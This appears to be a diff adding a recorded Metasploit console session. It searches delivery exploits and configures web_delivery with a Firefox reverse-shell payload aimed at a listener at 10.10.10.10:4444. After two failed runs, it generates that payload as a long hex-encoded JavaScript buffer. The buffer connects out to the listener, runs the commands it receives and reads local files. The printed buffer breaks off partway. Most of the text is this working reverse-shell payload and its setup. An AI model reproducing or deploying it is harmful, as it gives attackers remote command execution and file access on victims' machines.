+   10  exploit/windows/mssql/mssql_payload                         2000-05-30       [32mexcellent[0m  Yes    Microsoft SQL Server Payload Execution
+   11  exploit/windows/mssql/mssql_payload_sqli                    2000-05-30       [32mexcellent[0m  No     Microsoft SQL Server Payload Execution via SQL Injection
+   12  exploit/windows/smb/smb_[45mdelivery[0m                            2016-07-26       [32mexcellent[0m  No     SMB [45mDelivery[0m
+   13  exploit/windows/winrm/winrm_script_exec                     2012-11-01       manual     No     WinRM Script Exec Remote Code Execution
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> search delivery[P[Phow options earch delivery[Kuse mul[K[K[Kexploit/p[Kmulti/script/web_delivery 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload payload/firefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp[Pfirefox/shell_reverse_tcp
+[0mpayload => firefox/shell_reverse_tcp
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (firefox/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set LHOST 10.10.10.10
+[0mLHOST => 10.10.10.10
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show targets 
+[0m
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Python
+   1   PHP
+   2   PSH
+   3   Regsvr32
+   4   pubprn
+   5   PSH (Binary)
+   6   Linux
+   7   Mac OS X
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (firefox/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> exploit 
+[0m
+[1m[31m[-][0m Exploit failed: An exploitation error occurred.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show targets 
+[0m
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Python
+   1   PHP
+   2   PSH
+   3   Regsvr32
+   4   pubprn
+   5   PSH (Binary)
+   6   Linux
+   7   Mac OS X
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 5[Kset target 5
+[0mtarget => 5
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> exploit 
+[0m
+[1m[31m[-][0m Exploit failed: An exploitation error occurred.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use auxiliary/[K[K[K[K[K[K[K[K[K[Kpayload/firefox/shell_reverse_tcp
+[0m[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> [H[2J[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> show options 
+[0m
+Module options (payload/firefox/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> set LHOST 10.10.10.10.[K
+[0mLHOST => 10.10.10.10
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> [H[2J[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> a
+advanced  analyze   
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> a[Kba
+back    banner  
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> ba[K[Kc
+cd       check    clearm   color    connect  creds    
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> c[Kdb_
+db_connect        db_export         db_nmap           db_remove         db_status         
+db_disconnect     db_import         db_rebuild_cache  db_save           
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> db_[K[K[Ke
+edit  exit  
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> e[Kf[Kg
+generate  get       getg      grep      
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> ge
+generate  get       getg      
+[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> generate [H[2J[4mmsf5[0m payload([1m[31mfirefox/shell_reverse_tcp[0m) [0m> generate 
+[0m# firefox/shell_reverse_tcp - 7390 bytes
+# https://metasploit.com/
+# VERBOSE=false, LHOST=10.10.10.10, LPORT=4444, 
+# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
+# StagerRetryCount=10, StagerRetryWait=5, JsObfuscate=0, 
+# CreateSession=true
+buf = 
+"\x0a\x20\x20\x20\x20\x20\x20\x28\x66\x75\x6e\x63\x74\x69" +
+"\x6f\x6e\x28\x29\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x77\x69\x6e\x64\x6f\x77\x20\x3d\x20\x74\x68\x69\x73\x3b" +
+"\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x43\x6f\x6d\x70" +
+"\x6f\x6e\x65\x6e\x74\x73\x2e\x75\x74\x69\x6c\x73\x2e\x69" +
+"\x6d\x70\x6f\x72\x74\x28\x22\x72\x65\x73\x6f\x75\x72\x63" +
+"\x65\x3a\x2f\x2f\x67\x72\x65\x2f\x6d\x6f\x64\x75\x6c\x65" +
+"\x73\x2f\x4e\x65\x74\x55\x74\x69\x6c\x2e\x6a\x73\x6d\x22" +
+"\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72" +
+"\x20\x68\x6f\x73\x74\x20\x3d\x20\x27\x31\x30\x2e\x31\x30" +
+"\x2e\x31\x30\x2e\x31\x30\x27\x3b\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x76\x61\x72\x20\x70\x6f\x72\x74\x20\x3d\x20" +
+"\x34\x34\x34\x34\x3b\x0a\x0a\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x76\x61\x72\x20\x73\x6f\x63\x6b\x65\x74\x54\x72\x61" +
+"\x6e\x73\x70\x6f\x72\x74\x20\x3d\x20\x43\x6f\x6d\x70\x6f" +
+"\x6e\x65\x6e\x74\x73\x2e\x63\x6c\x61\x73\x73\x65\x73\x5b" +
+"\x22\x40\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e\x6f\x72\x67\x2f" +
+"\x6e\x65\x74\x77\x6f\x72\x6b\x2f\x73\x6f\x63\x6b\x65\x74" +
+"\x2d\x74\x72\x61\x6e\x73\x70\x6f\x72\x74\x2d\x73\x65\x72" +
+"\x76\x69\x63\x65\x3b\x31\x22\x5d\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2e" +
+"\x67\x65\x74\x53\x65\x72\x76\x69\x63\x65\x28\x43\x6f\x6d" +
+"\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x69\x6e\x74\x65\x72\x66" +
+"\x61\x63\x65\x73\x2e\x6e\x73\x49\x53\x6f\x63\x6b\x65\x74" +
+"\x54\x72\x61\x6e\x73\x70\x6f\x72\x74\x53\x65\x72\x76\x69" +
+"\x63\x65\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x76" +
+"\x61\x72\x20\x73\x6f\x63\x6b\x65\x74\x20\x3d\x20\x73\x6f" +
+"\x63\x6b\x65\x74\x54\x72\x61\x6e\x73\x70\x6f\x72\x74\x2e" +
+"\x63\x72\x65\x61\x74\x65\x54\x72\x61\x6e\x73\x70\x6f\x72" +
+"\x74\x28\x6e\x75\x6c\x6c\x2c\x20\x30\x2c\x20\x68\x6f\x73" +
+"\x74\x2c\x20\x70\x6f\x72\x74\x2c\x20\x6e\x75\x6c\x6c\x29" +
+"\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20" +
+"\x6f\x75\x74\x53\x74\x72\x65\x61\x6d\x20\x3d\x20\x73\x6f" +
+"\x63\x6b\x65\x74\x2e\x6f\x70\x65\x6e\x4f\x75\x74\x70\x75" +
+"\x74\x53\x74\x72\x65\x61\x6d\x28\x30\x2c\x20\x30\x2c\x20" +
+"\x30\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61" +
+"\x72\x20\x69\x6e\x53\x74\x72\x65\x61\x6d\x20\x3d\x20\x73" +
+"\x6f\x63\x6b\x65\x74\x2e\x6f\x70\x65\x6e\x49\x6e\x70\x75" +
+"\x74\x53\x74\x72\x65\x61\x6d\x28\x30\x2c\x20\x30\x2c\x20" +
+"\x30\x29\x3b\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x76" +
+"\x61\x72\x20\x70\x75\x6d\x70\x20\x3d\x20\x43\x6f\x6d\x70" +
+"\x6f\x6e\x65\x6e\x74\x73\x2e\x63\x6c\x61\x73\x73\x65\x73" +
+"\x5b\x22\x40\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e\x6f\x72\x67" +
+"\x2f\x6e\x65\x74\x77\x6f\x72\x6b\x2f\x69\x6e\x70\x75\x74" +
+"\x2d\x73\x74\x72\x65\x61\x6d\x2d\x70\x75\x6d\x70\x3b\x31" +
+"\x22\x5d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2e\x63" +
+"\x72\x65\x61\x74\x65\x49\x6e\x73\x74\x61\x6e\x63\x65\x28" +
+"\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x69\x6e\x74" +
+"\x65\x72\x66\x61\x63\x65\x73\x2e\x6e\x73\x49\x49\x6e\x70" +
+"\x75\x74\x53\x74\x72\x65\x61\x6d\x50\x75\x6d\x70\x29\x3b" +
+"\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x70\x75\x6d\x70\x2e" +
+"\x69\x6e\x69\x74\x28\x69\x6e\x53\x74\x72\x65\x61\x6d\x2c" +
+"\x20\x2d\x31\x2c\x20\x2d\x31\x2c\x20\x30\x2c\x20\x30\x2c" +
+"\x20\x74\x72\x75\x65\x29\x3b\x0a\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20" +
+"\x72\x65\x61\x64\x55\x6e\x74\x69\x6c\x54\x6f\x6b\x65\x6e" +
+"\x20\x3d\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x63\x62" +
+"\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x43\x6f" +
+"\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x75\x74\x69\x6c\x73" +
+"\x2e\x69\x6d\x70\x6f\x72\x74\x28\x22\x72\x65\x73\x6f\x75" +
+"\x72\x63\x65\x3a\x2f\x2f\x67\x72\x65\x2f\x6d\x6f\x64\x75" +
+"\x6c\x65\x73\x2f\x4e\x65\x74\x55\x74\x69\x6c\x2e\x6a\x73" +
+"\x6d\x22\x29\x3b\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x76\x61\x72\x20\x62\x75\x66\x66\x65\x72\x20\x3d\x20\x27" +
+"\x27\x2c\x20\x6d\x20\x3d\x20\x6e\x75\x6c\x6c\x3b\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20" +
+"\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x72\x65\x71\x75\x65" +
+"\x73\x74\x2c\x20\x63\x6f\x6e\x74\x65\x78\x74\x2c\x20\x73" +
+"\x74\x72\x65\x61\x6d\x2c\x20\x6f\x66\x66\x73\x65\x74\x2c" +
+"\x20\x63\x6f\x75\x6e\x74\x29\x20\x7b\x0a\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x62\x75\x66\x66\x65\x72\x20\x2b" +
+"\x3d\x20\x4e\x65\x74\x55\x74\x69\x6c\x2e\x72\x65\x61\x64" +
+"\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x54\x6f\x53" +
+"\x74\x72\x69\x6e\x67\x28\x73\x74\x72\x65\x61\x6d\x2c\x20" +
+"\x63\x6f\x75\x6e\x74\x29\x3b\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x69\x66\x20\x28\x62\x75\x66\x66\x65\x72" +
+"\x2e\x6d\x61\x74\x63\x68\x28\x2f\x5e\x28\x5c\x5b\x5c\x5b" +
+"\x5c\x77\x7b\x38\x7d\x5c\x5d\x5c\x5d\x29\x2f\x29\x29\x20" +
+"\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x69\x66\x20\x28\x6d\x20\x3d\x20\x62\x75\x66\x66\x65\x72" +
+"\x2e\x6d\x61\x74\x63\x68\x28\x2f\x5e\x28\x5c\x5b\x5c\x5b" +
+"\x5c\x77\x7b\x38\x7d\x5c\x5d\x5c\x5d\x29\x28\x5b\x5c\x73" +
+"\x5c\x53\x5d\x2a\x29\x5c\x31\x2f\x29\x29\x20\x7b\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x63" +
+"\x62\x28\x6d\x5b\x32\x5d\x29\x3b\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x62\x75\x66\x66\x65" +
+"\x72\x20\x3d\x20\x27\x27\x3b\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x7d\x20\x65\x6c\x73\x65\x20\x69\x66\x20" +
+"\x28\x62\x75\x66\x66\x65\x72\x2e\x69\x6e\x64\x65\x78\x4f" +
+"\x66\x28\x22\x5c\x6e\x22\x29\x20\x3e\x20\x2d\x31\x29\x20" +
+"\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x63\x62\x28\x62\x75\x66\x66\x65\x72\x29\x3b\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x62\x75\x66\x66" +
+"\x65\x72\x20\x3d\x20\x27\x27\x3b\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x7d\x3b\x0a\x20\x20\x20\x20\x20\x20\x7d\x3b\x0a\x20" +
+"\x20\x20\x20\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x76" +
+"\x61\x72\x20\x6c\x69\x73\x74\x65\x6e\x65\x72\x20\x3d\x20" +
+"\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6f\x6e" +
+"\x53\x74\x61\x72\x74\x52\x65\x71\x75\x65\x73\x74\x3a\x20" +
+"\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x72\x65\x71\x75\x65" +
+"\x73\x74\x2c\x20\x63\x6f\x6e\x74\x65\x78\x74\x29\x20\x7b" +
+"\x7d\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6f" +
+"\x6e\x53\x74\x6f\x70\x52\x65\x71\x75\x65\x73\x74\x3a\x20" +
+"\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x72\x65\x71\x75\x65" +
+"\x73\x74\x2c\x20\x63\x6f\x6e\x74\x65\x78\x74\x29\x20\x7b" +
+"\x7d\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6f" +
+"\x6e\x44\x61\x74\x61\x41\x76\x61\x69\x6c\x61\x62\x6c\x65" +
+"\x3a\x20\x72\x65\x61\x64\x55\x6e\x74\x69\x6c\x54\x6f\x6b" +
+"\x65\x6e\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x64\x61" +
+"\x74\x61\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x72\x75\x6e\x43\x6d\x64\x28\x64\x61\x74" +
+"\x61\x2c\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x65\x72" +
+"\x72\x2c\x20\x6f\x75\x74\x70\x75\x74\x29\x20\x7b\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69" +
+"\x66\x20\x28\x21\x65\x72\x72\x29\x20\x6f\x75\x74\x53\x74" +
+"\x72\x65\x61\x6d\x2e\x77\x72\x69\x74\x65\x28\x6f\x75\x74" +
+"\x70\x75\x74\x2c\x20\x6f\x75\x74\x70\x75\x74\x2e\x6c\x65" +
+"\x6e\x67\x74\x68\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x7d\x29\x3b\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x7d\x29\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x7d\x3b\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20" +
+"\x76\x61\x72\x20\x72\x65\x61\x64\x46\x69\x6c\x65\x20\x3d" +
+"\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x70\x61\x74\x68" +
+"\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x74\x72" +
+"\x79\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x76\x61\x72\x20\x66\x69\x6c\x65\x20\x3d\x20\x43\x6f\x6d" +
+"\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x63\x6c\x61\x73\x73\x65" +
+"\x73\x5b\x22\x40\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e\x6f\x72" +
+"\x67\x2f\x66\x69\x6c\x65\x2f\x6c\x6f\x63\x61\x6c\x3b\x31" +
+"\x22\x5d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x2e\x63\x72\x65\x61\x74" +
+"\x65\x49\x6e\x73\x74\x61\x6e\x63\x65\x28\x43\x6f\x6d\x70" +
+"\x6f\x6e\x65\x6e\x74\x73\x2e\x69\x6e\x74\x65\x72\x66\x61" +
+"\x63\x65\x73\x2e\x6e\x73\x49\x4c\x6f\x63\x61\x6c\x46\x69" +
+"\x6c\x65\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x66\x69\x6c\x65\x2e\x69\x6e\x69\x74\x57\x69\x74\x68" +
+"\x50\x61\x74\x68\x28\x70\x61\x74\x68\x29\x3b\x0a\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20\x66" +
+"\x69\x6c\x65\x53\x74\x72\x65\x61\x6d\x20\x3d\x20\x43\x6f" +
+"\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x63\x6c\x61\x73\x73" +
+"\x65\x73\x5b\x22\x40\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e\x6f" +
+"\x72\x67\x2f\x6e\x65\x74\x77\x6f\x72\x6b\x2f\x66\x69\x6c" +
+"\x65\x2d\x69\x6e\x70\x75\x74\x2d\x73\x74\x72\x65\x61\x6d" +
+"\x3b\x31\x22\x5d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x2e\x63\x72\x65\x61\x74\x65\x49\x6e\x73" +
+"\x74\x61\x6e\x63\x65\x28\x43\x6f\x6d\x70\x6f\x6e\x65\x6e" +
+"\x74\x73\x2e\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x73\x2e" +
+"\x6e\x73\x49\x46\x69\x6c\x65\x49\x6e\x70\x75\x74\x53\x74" +
+"\x72\x65\x61\x6d\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x66\x69\x6c\x65\x53\x74\x72\x65\x61\x6d\x2e" +
+"\x69\x6e\x69\x74\x28\x66\x69\x6c\x65\x2c\x20\x31\x2c\x20" +
+"\x30\x2c\x20\x66\x61\x6c\x73\x65\x29\x3b\x0a\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20\x62\x69" +
+"\x6e\x61\x72\x79\x53\x74\x72\x65\x61\x6d\x20\x3d\x20\x43" +
+"\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x63\x6c\x61\x73" +
+"\x73\x65\x73\x5b\x22\x40\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e" +
+"\x6f\x72\x67\x2f\x62\x69\x6e\x61\x72\x79\x69\x6e\x70\x75" +
+"\x74\x73\x74\x72\x65\x61\x6d\x3b\x31\x22\x5d\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2e" +
+"\x63\x72\x65\x61\x74\x65\x49\x6e\x73\x74\x61\x6e\x63\x65" +
+"\x28\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x69\x6e" +
+"\x74\x65\x72\x66\x61\x63\x65\x73\x2e\x6e\x73\x49\x42\x69" +
+"\x6e\x61\x72\x79\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61" +
+"\x6d\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x62\x69\x6e\x61\x72\x79\x53\x74\x72\x65\x61\x6d\x2e\x73" +
+"\x65\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x28" +
+"\x66\x69\x6c\x65\x53\x74\x72\x65\x61\x6d\x29\x3b\x0a\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20\x61" +
+"\x72\x72\x61\x79\x20\x3d\x20\x62\x69\x6e\x61\x72\x79\x53" +
+"\x74\x72\x65\x61\x6d\x2e\x72\x65\x61\x64\x42\x79\x74\x65" +
+"\x41\x72\x72\x61\x79\x28\x66\x69\x6c\x65\x53\x74\x72\x65" +
+"\x61\x6d\x2e\x61\x76\x61\x69\x6c\x61\x62\x6c\x65\x28\x29" +
+"\x29\x3b\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20" +
+"\x62\x69\x6e\x61\x72\x79\x53\x74\x72\x65\x61\x6d\x2e\x63" +
+"\x6c\x6f\x73\x65\x28\x29\x3b\x0a\x20\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x66\x69\x6c\x65\x53\x74\x72\x65\x61\x6d" +
+"\x2e\x63\x6c\x6f\x73\x65\x28\x29\x3b\x0a\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x66\x69\x6c\x65\x2e\x72\x65\x6d" +
+"\x6f\x76\x65\x28\x74\x72\x75\x65\x29\x3b\x0a\x0a\x20\x20" +
+"\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e" +
+"\x20\x61\x72\x72\x61\x79\x2e\x6d\x61\x70\x28\x66\x75\x6e" +
+"\x63\x74\x69\x6f\x6e\x28\x61\x49\x74\x65\x6d\x29\x20\x7b" +
+"\x20\x72\x65\x74\x75\x72\x6e\x20\x53\x74\x72\x69\x6e\x67" +
+"\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28" +
+"\x61\x49\x74\x65\x6d\x29\x3b\x20\x7d\x29\x2e\x6a\x6f\x69" +
+"\x6e\x28\x22\x22\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20" +
+"\x20\x7d\x20\x63\x61\x74\x63\x68\x20\x28\x65\x29\x20\x7b" +
+"\x20\x72\x65\x74\x75\x72\x6e\x20\x22\x22\x3b\x20\x7d\x0a" +
+"\x20\x20\x20\x20\x20\x20\x7d\x3b\x0a\x20\x20\x20\x20\x0a" +
+"\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x76" +
+"\x61\x72\x20\x73\x65\x74\x54\x69\x6d\x65\x6f\x75\x74\x20" +
+"\x3d\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x63\x62\x2c" +
+"\x20\x64\x65\x6c\x61\x79\x29\x20\x7b\x0a\x20\x20\x20\x20" +
+"\x20\x20\x20\x20\x76\x61\x72\x20\x74\x69\x6d\x65\x72\x20" +
+"\x3d\x20\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2e\x63" +
+"\x6c\x61\x73\x73\x65\x73\x5b\x22\x40\x6d\x6f\x7a\x69\x6c" +
+"\x6c\x61\x2e\x6f\x72\x67\x2f\x74\x69\x6d\x65\x72\x3b\x31" +
+"\x22\x5d\x2e\x63\x72\x65\x61\x74\x65\x49\x6e\x73\x74\x61" +
+"\x6e\x63\x65\x28\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73" +
+"\x2e\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x73\x2e\x6e\x73" +
+"\x49\x54\x69\x6d\x65\x72\x29\x3b\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x74\x69\x6d\x65\x72\x2e\x69\x6e\x69\x74\x57" +
+"\x69\x74\x68\x43\x61\x6c\x6c\x62\x61\x63\x6b\x28\x7b\x6e" +
+"\x6f\x74\x69\x66\x79\x3a\x63\x62\x7d\x2c\x20\x64\x65\x6c" +
+"\x61\x79\x2c\x20\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73" +
+"\x2e\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x73\x2e\x6e\x73" +
+"\x49\x54\x69\x6d\x65\x72\x2e\x54\x59\x50\x45\x5f\x4f\x4e" +
+"\x45\x5f\x53\x48\x4f\x54\x29\x3b\x0a\x20\x20\x20\x20\x20" +
+"\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x74\x69\x6d\x65" +
+"\x72\x3b\x0a\x20\x20\x20\x20\x20\x20\x7d\x3b\x0a\x20\x20" +
+"\x20\x20\x0a\x0a\x20\x20\x20\x20\x20\x20\x76\x61\x72\x20" +
+"\x75\x61\x20\x3d\x20\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74" +
+"\x73\x2e\x63\x6c\x61\x73\x73\x65\x73\x5b\x22\x40\x6d\x6f" +
